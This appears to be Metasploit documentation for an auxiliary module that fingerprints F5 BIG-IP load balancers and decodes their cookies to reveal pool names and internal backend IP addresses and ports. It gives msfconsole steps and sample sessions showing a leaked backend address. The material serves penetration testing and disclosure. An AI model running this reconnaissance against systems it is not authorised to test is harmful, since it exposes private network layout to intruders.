## Vulnerable Application

This module identifies F5 BIG-IP load balancers and leaks backend information (pool name, routed domain,
and backend servers' IP addresses and ports) through cookies inserted by the BIG-IP systems.

## Verification Steps

1. Start `msfconsole`
1. Do: `use auxiliary/gather/f5_bigip_cookie_disclosure`
1. Do: `set RHOSTS www.example.com`
1. Do: `run`

## Options

### REQUESTS

  The number of requests to send. Default value is `10`.

## Scenarios

### F5 BIP-IP load balancing cookie not found

```
msf5 > use auxiliary/gather/f5_bigip_cookie_disclosure
msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > set RHOSTS www.example.com
RHOSTS => www.example.com
msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > run
[*] Running module against 93.184.216.34

[*] Starting request /
[-] F5 BIG-IP load balancing cookie not found
[*] Auxiliary module execution completed
msf5 auxiliary(gather/f5_bigip_cookie_disclosure) >
```

### F5 BIP-IP load balancing cookie found

```
msf5 > use auxiliary/gather/f5_bigip_cookie_disclosure
msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > set RHOSTS vulnerable-target.com
RHOSTS => vulnerable-target.com
msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > run
[*] Running module against 1.1.1.1

[*] Starting request /
[+] F5 BIG-IP load balancing cookie "BIGipServer~DMZ~EXAMPLE~vulnarable-target-443_pool = 1214841098.47873.0000" found
[+] Load balancing pool name "~DMZ~EXAMPLE~vulnarable-target-443_pool" found
[+] Backend 10.1.105.72:443 found
[*] Auxiliary module execution completed
msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > notes

Notes
=====

 Time                     Host             Service  Port  Protocol  Type                           Data
 ----                     ----             -------  ----  --------  ----                           ----
 2019-08-20 21:21:02 UTC  1.1.1.1                                   f5_load_balancer_cookie_name   "BIGipServer~DMZ~EXAMPLE~vulnarable-target-443_pool"
 2019-08-20 21:21:02 UTC  1.1.1.1                                   f5_load_balancer_pool_name     "~DMZ~EXAMPLE~vulnarable-target-443_pool"
 2019-08-20 21:21:02 UTC  1.1.1.1                                   f5_load_balancer_backends      [{:host=>"10.1.105.72", :port=>443}]
msf5 auxiliary(gather/f5_bigip_cookie_disclosure) >
```
